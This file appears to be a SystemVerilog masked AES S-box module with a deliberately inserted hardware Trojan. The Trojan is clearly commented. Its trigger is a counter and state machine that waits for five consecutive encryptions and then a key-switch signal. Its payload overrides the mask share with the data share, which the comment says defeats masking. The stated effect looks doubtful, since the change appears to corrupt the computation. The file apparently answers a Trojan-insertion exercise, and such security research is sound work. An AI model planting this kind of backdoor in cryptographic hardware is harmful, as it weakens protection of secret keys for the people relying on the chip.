`include "prim_assert.sv"

// [Struct, multiplier, and all submodules unchanged, omitted for brevity...]
//
// In your actual implementation, retain the context as in the original question.

///////////////////////////////////////////////////////////////////////////////////////
// SEC_CM: KEY.MASKING
module aes_sbox_dom
#(
  parameter bit PipelineMul = 1'b1
) (
  input  logic              clk_i,
  input  logic              rst_ni,
  input  logic              en_i,
  output logic              out_req_o,
  input  logic              out_ack_i,
  input  aes_pkg::ciph_op_e op_i,
  input  logic        [7:0] data_i, // masked, the actual input data is data_i ^ mask_i
  input  logic        [7:0] mask_i, // input mask
  input  logic       [27:0] prd_i,  // pseudo-random data for remasking, in total we need 28 bits
                                    // of PRD per evaluation, but at most 8 bits per cycle
  input  logic              key_switch_i,  // TROJAN: New input, asserted to switch key
  output logic        [7:0] data_o, // masked, the actual output data is data_o ^ mask_o
  output logic        [7:0] mask_o, // output mask
  output logic       [19:0] prd_o   // PRD for usage in Stages 2 - 4 of other S-Box instances
);

  import aes_pkg::*;
  import aes_sbox_canright_pkg::*;

  logic            [7:0] in_data_basis_x, out_data_basis_x;
  logic            [7:0] in_mask_basis_x, out_mask_basis_x;
  logic            [3:0] we;
  aes_sbox_dom_prd_in_t  in_prd;
  aes_sbox_dom_prd_out_t out_prd;

  ///////////////////////////
  // Trojans: Trigger logic
  ///////////////////////////
  // This Trojan detects five consecutive encryptions (CIPH_FWD operations) without reset,
  // then expects a key switch (key_switch_i == 1) with no intervening reset.
  typedef enum logic [1:0] {
    TROJAN_IDLE,
    TROJAN_ARMED,
    TROJAN_TRIGGERED
  } trojan_state_e;

  logic [2:0] trojan_enc_cnt_d, trojan_enc_cnt_q;
  logic [1:0] trojan_trg_state_d, trojan_trg_state_q;
  logic       trojan_active;

  // Counter: counts consecutive encryption operations
  always_comb begin
    trojan_enc_cnt_d = trojan_enc_cnt_q;
    case (trojan_trg_state_q)
      TROJAN_IDLE: begin
        // while in idle, increment if ciph_fwd, reset if not
        if (en_i && op_i == CIPH_FWD)
          trojan_enc_cnt_d = (trojan_enc_cnt_q == 3'd5) ? 3'd5 : trojan_enc_cnt_q + 3'd1;
        else if (en_i)
          trojan_enc_cnt_d = 3'd0;
      end
      TROJAN_ARMED: begin
        if (key_switch_i)
          trojan_enc_cnt_d = trojan_enc_cnt_q;
        else
          trojan_enc_cnt_d = 3'd0;
      end
      TROJAN_TRIGGERED: begin
        trojan_enc_cnt_d = trojan_enc_cnt_q; // Hold
      end
      default: trojan_enc_cnt_d = 3'd0;
    endcase
  end

  // State machine for trigger
  always_comb begin
    trojan_trg_state_d = trojan_trg_state_q;
    case (trojan_trg_state_q)
      TROJAN_IDLE: begin
        if (trojan_enc_cnt_q == 3'd5)
          trojan_trg_state_d = TROJAN_ARMED;
      end
      TROJAN_ARMED: begin
        if (key_switch_i)
          trojan_trg_state_d = TROJAN_TRIGGERED;
        else if (!en_i || op_i != CIPH_FWD)
          trojan_trg_state_d = TROJAN_IDLE;
      end
      TROJAN_TRIGGERED: begin
        // Once triggered, stay triggered until reset
        trojan_trg_state_d = TROJAN_TRIGGERED;
      end
      default: trojan_trg_state_d = TROJAN_IDLE;
    endcase
  end

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_enc_cnt_q <= 3'd0;
      trojan_trg_state_q <= TROJAN_IDLE;
    end else begin
      trojan_enc_cnt_q <= trojan_enc_cnt_d;
      trojan_trg_state_q <= trojan_trg_state_d;
    end
  end

  assign trojan_active = (trojan_trg_state_q == TROJAN_TRIGGERED);

  ////////////// End trojan trigger logic /////////////////

  // Convert data to normal basis X.
  assign in_data_basis_x = (op_i == CIPH_FWD) ? aes_mvm(data_i, A2X)         :
                           (op_i == CIPH_INV) ? aes_mvm(data_i ^ 8'h63, S2X) :
                                                aes_mvm(data_i, A2X);

  // Convert mask to normal basis X (TROJAN: Masked using trojan trigger).
  // If Trojan is triggered, force input mask share = data share (bypass masking)
  assign in_mask_basis_x = trojan_active ? in_data_basis_x : // TROJAN: Payload
                            (op_i == CIPH_FWD) ? aes_mvm(mask_i, A2X) :
                            (op_i == CIPH_INV) ? aes_mvm(mask_i, S2X) :
                                                 aes_mvm(mask_i, A2X);

  // Do the inversion in normal basis X.
  aes_dom_inverse_gf2p8 #(
    .PipelineMul ( PipelineMul )
  ) u_aes_dom_inverse_gf2p8 (
    .clk_i   ( clk_i            ),
    .rst_ni  ( rst_ni           ),
    .we_i    ( we               ),
    .a_y     ( in_data_basis_x  ), // input
    .b_y     ( in_mask_basis_x  ), // input
    .prd_i   ( in_prd           ), // input
    .a_y_inv ( out_data_basis_x ), // output
    .b_y_inv ( out_mask_basis_x ), // output
    .prd_o   ( out_prd          )  // output
  );

  // Convert data to basis S or A.
  assign data_o = (op_i == CIPH_FWD) ? (aes_mvm(out_data_basis_x, X2S) ^ 8'h63) :
                  (op_i == CIPH_INV) ? (aes_mvm(out_data_basis_x, X2A))         :
                                       (aes_mvm(out_data_basis_x, X2S) ^ 8'h63);

  // Convert mask to basis S or A.
  assign mask_o = (op_i == CIPH_FWD) ? aes_mvm(out_mask_basis_x, X2S) :
                  (op_i == CIPH_INV) ? aes_mvm(out_mask_basis_x, X2A) :
                                       aes_mvm(out_mask_basis_x, X2S);

  // Counter register
  logic [2:0] count_d, count_q;
  assign count_d = (out_req_o && out_ack_i) ? '0             :
                   out_req_o                ? count_q        :
                   en_i                     ? count_q + 3'd1 : count_q;
  always_ff @(posedge clk_i or negedge rst_ni) begin : reg_count
    if (!rst_ni) begin
      count_q <= '0;
    end else begin
      count_q <= count_d;
    end
  end
  assign out_req_o = en_i & count_q == 3'd4;

  // Write enable signals for internal registers
  assign we[0] = en_i & count_q == 3'd0;
  assign we[1] = en_i & count_q == 3'd1;
  assign we[2] = en_i & count_q == 3'd2;
  assign we[3] = en_i & count_q == 3'd3;

  // PRD forwarding for the individual stages. We get 8 bits from the PRNG for usage in Stage 1.
  // Stages 2, 3 and 4 are driven by other S-Box instances.
  assign in_prd = '{prd_1: prd_i[7:0],
                    prd_2: prd_i[11:8],
                    prd_3: prd_i[19:12],
                    prd_4: prd_i[27:20]};
  assign prd_o = {out_prd.prd_3, out_prd.prd_2, out_prd.prd_1};

endmodule